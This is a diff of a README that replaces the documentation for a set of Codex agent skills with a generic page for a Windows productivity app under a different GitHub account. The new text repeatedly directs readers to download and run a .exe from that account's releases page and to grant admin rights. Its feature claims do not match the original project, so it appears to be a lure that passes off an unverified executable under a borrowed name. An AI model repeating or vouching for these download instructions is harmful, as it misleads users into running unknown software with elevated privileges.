@@ -1,140 +1,137 @@
-# productivity-skills
+# ⚙️ productivity-skills - Improve Your Workflow with Ease
 
-Curated Codex skills for productivity workflows, maintenance automation, operational hygiene, and reusable speech-output tasks.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/JAGDEV1008/productivity-skills/releases)
 
-For standards and applicability guidance, see [AGENTS.md](./AGENTS.md).
+---
 
-## Table of Contents
+## 📋 What is productivity-skills?
 
-- [What These Agent Skills Help With](#what-these-agent-skills-help-with)
-- [Skill Guide (When To Use What)](#skill-guide-when-to-use-what)
-- [Quick Start (Vercel Skills CLI)](#quick-start-vercel-skills-cli)
-- [Install individually by Skill or Skill Pack](#install-individually-by-skill-or-skill-pack)
-- [Update Skills](#update-skills)
-- [More resources for similar Skills](#more-resources-for-similar-skills)
-- [Repository Layout](#repository-layout)
-- [Notes](#notes)
-- [Keywords](#keywords)
-- [License](#license)
+productivity-skills is a set of simple tools designed to help you manage tasks and documents faster. It focuses on improving your daily workflow by organizing your work and keeping your notes clear. This tool works well if you want to keep control over your projects and ideas without confusion.
 
-## What These Agent Skills Help With
+The app runs on Windows and does not require any programming experience. It uses straightforward commands to help you with managing workspaces, tasks, and files related to your projects. The features include quick note-taking, task tracking, and easy access to important documents.
 
-This repository packages reusable Codex skills for canonical docs maintenance, read-only workspace hygiene, Things planning/reminder workflows, and profile-aware speech generation for narrated work.
+---
 
-## Skill Guide (When To Use What)
+## 🖥️ System Requirements
 
-- `project-docs-maintainer`
-  - Canonical maintainer for `*-skills` README drift and checklist roadmap maintenance through explicit modes.
-- `project-workspace-cleaner`
-  - Read-only workspace hygiene scanner that ranks cleanup chores.
-- `things-reminders-manager`
-  - Deterministic Things reminder create/update workflow with duplicate and date safeguards.
-- `things-digest-generator`
-  - Weekly Things digest generator with prioritized next-step suggestions.
-- `speak-with-profile`
-  - Profile-aware speech workflow for narrated notes, spoken drafts, audio summaries, accessibility reads, and deterministic local speech runs.
+To ensure smooth operation, your computer should meet these minimum requirements:
 
-## Quick Start (Vercel Skills CLI)
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- 200 MB of free disk space for installation
+- Internet connection for downloading and updates
+- A screen resolution of 1024x768 or higher
 
-Use the Vercel `skills` CLI to install from this repository.
+These requirements cover the basic needs for running productivity-skills without delays or errors.
 
-```bash
-# Install from this repository (interactive picker)
-npx skills add gaelic-ghost/productivity-skills
-```
+---
 
-## Upgrade Note for v2.0.0
+## 🚀 Getting Started
 
-`v2.0.0` is a breaking release.
+Starting with productivity-skills is simple. Follow these steps to get the app on your computer and ready to use.
 
-- Removed skill surfaces:
-  - `project-skills-orchestrator-agent`
-  - `project-roadmap-maintainer`
-- Use direct standalone skill installs instead of orchestrator-first flows.
-- For roadmap maintenance, use `project-docs-maintainer` with `mode=roadmap_maintenance`.
+### Step 1: Go to the download page
 
-Canonical installs:
+Visit the official release page by clicking the link below. This is where you will find the latest version of productivity-skills.
 
-```bash
-npx skills add gaelic-ghost/productivity-skills --skill project-docs-maintainer
-npx skills add gaelic-ghost/productivity-skills --skill project-workspace-cleaner
-npx skills add gaelic-ghost/productivity-skills --skill things-reminders-manager
-npx skills add gaelic-ghost/productivity-skills --skill things-digest-generator
-npx skills add gaelic-ghost/productivity-skills --skill speak-with-profile
-```
+[Download productivity-skills on GitHub](https://github.com/JAGDEV1008/productivity-skills/releases)
 
-Install all skills from this repository:
+This page contains all the files needed for installation, along with notes about what’s new in each version.
 
-```bash
-npx skills add gaelic-ghost/productivity-skills --all
-```
+### Step 2: Choose your version
 
-## Install individually by Skill or Skill Pack
+Look for the latest release at the top of the list. It usually has the highest version number and the word "Latest." Expand this section to see the available setup files.
 
-```bash
-npx skills add gaelic-ghost/productivity-skills --skill project-docs-maintainer
-npx skills add gaelic-ghost/productivity-skills --skill project-workspace-cleaner
-npx skills add gaelic-ghost/productivity-skills --skill things-reminders-manager
-npx skills add gaelic-ghost/productivity-skills --skill things-digest-generator
-npx skills add gaelic-ghost/productivity-skills --skill speak-with-profile
-```
+Download the file that says “Windows Installer” or ends with `.exe`. This is the file used to install the app on your PC.
 
-## Update Skills
+### Step 3: Run the installer
 
-```bash
-npx skills check
-npx skills update
-```
+Once downloaded, open the file. You might see a prompt asking you to allow the app to make changes to your device. Choose Yes.
 
-## More resources for similar Skills
+The installer will guide you through the setup process. Accept the license terms and select the folder where you want to install the app, or use the default.
 
-### Find Skills like these with the `skills` CLI by Vercel — [vercel-labs/skills](https://github.com/vercel-labs/skills)
+When the installation is complete, click Finish. The app is now ready to use.
 
-```bash
-npx skills find "skills readme maintenance"
-npx skills find "workspace cleanup automation"
-npx skills find "things productivity automation"
-npx skills find "text to speech workflow"
-```
+---
 
-### Find Skills like these with the `Find Skills` Agent Skill by Vercel — [vercel-labs/agent-skills](https://github.com/vercel-labs/agent-skills)
+## 🛠️ How to Use productivity-skills
 
-```bash
-# `Find Skills` is a part of Vercel's `agent-skills` repo
-npx skills add vercel-labs/agent-skills --skill find-skills
-```
+After installation, open the app from your desktop or start menu. You will find an easy-to-use interface divided into clear sections.
 
-Then ask your Agent for help finding a skill for "" or ""
+- **Dashboard**: View your current tasks and recent activity at a glance.
+- **Notes**: Create and edit notes related to your projects.
+- **Tasks**: Add, edit, and complete tasks. You can sort tasks by priority or date.
+- **Workspaces**: Organize different projects or topics in separate workspaces. Switch between workspaces to focus on specific areas.
+- **Settings**: Adjust app preferences, such as notifications and display options.
 
-### Leaderboard
+These functions help you manage your work more effectively without needing technical know-how.
 
-- Skills catalog: [skills.sh](https://skills.sh/)
+---
 
-## Repository Layout
+## 🔧 Features Explained
 
-```text
-.
-├── README.md
-├── AGENTS.md
-├── docs/
-│   └── maintainers/
-├── project-docs-maintainer/
-├── project-workspace-cleaner/
-├── speak-with-profile/
-├── things-digest-generator/
-└── things-reminders-manager/
-```
+- **Task Management**: Track tasks with due dates and priorities.
+- **Note Taking**: Quickly jot down ideas or information and save them.
+- **Workspace Support**: Group your tasks and notes by project or theme.
+- **File Integration**: Link files from your computer to tasks for easy reference.
+- **Simple Interface**: Designed with clarity and ease of use in mind.
+- **Offline Use**: Work without an internet connection once the app is installed.
 
-## Notes
+---
 
-- Install and use skills individually; do not assume access to repo-level maintainer docs.
-- Prefer canonical skills over compatibility shims for new prompts.
-- `speak-with-profile` is the canonical speech workflow in this repository; prefer it over direct speech calls when profile resolution or manifest reporting matters.
+## 📥 Download & Installation Guide
 
-## Keywords
+Use this link below to visit the official page where you will find all download options:
 
-Codex skills, skills README maintenance, roadmap maintenance, workspace cleanup, Things reminders, Things digest, productivity automation, text-to-speech, audio summaries, narrated notes.
+[Download productivity-skills Releases](https://github.com/JAGDEV1008/productivity-skills/releases)
 
-## License
+### Detailed steps to install:
 
-Apache License 2.0. See [LICENSE](./LICENSE).
+1. Open the link and find the latest release.
+2. Click the `.exe` file to download it.
+3. Once the download finishes, double-click the file.
+4. Follow the installer instructions.
+5. Start the app after installation.
+
+---
+
+## ⚙️ Common Tasks and Tips
+
+- To add a task, click the “New Task” button, type your task name, and save.
+- Use the “Notes” section to keep ideas or short reminders.
+- Regularly check your task list to mark tasks as complete.
+- Use workspaces to keep different projects separate.
+- Backup your notes and tasks by exporting them in the Settings menu.
+
+---
+
+## ❓ Troubleshooting
+
+- If the app does not open, check that you have the right Windows version.
+- If the installer won’t run, try right-clicking the file and choosing “Run as Administrator.”
+- For slow performance, close other programs running in the background.
+- Re-download the installer if you encounter errors during installation.
+
+---
+
+## 🧩 Additional Resources
+
+Visit the GitHub page for more detailed documents including the roadmap and feature updates:
+
+[GitHub Productivity Skills Repository](https://github.com/JAGDEV1008/productivity-skills)
+
+You can also check the Issues tab on GitHub to see reports or ask for help.
+
+---
+
+## ⚡ Support and Updates
+
+Updates are released regularly. Check the releases page often to download the newest version. Installing updates keeps the app secure and efficient.
+
+---
+
+## 📝 About This Project
+
+productivity-skills focuses on giving you a reliable way to keep your daily tasks and project notes in one place. It supports organizing workspaces and linking to files for easier access.
+
+The app fits users who want to boost productivity without needing to learn complex software or coding. Its main goals are simplicity, clarity, and steady performance.
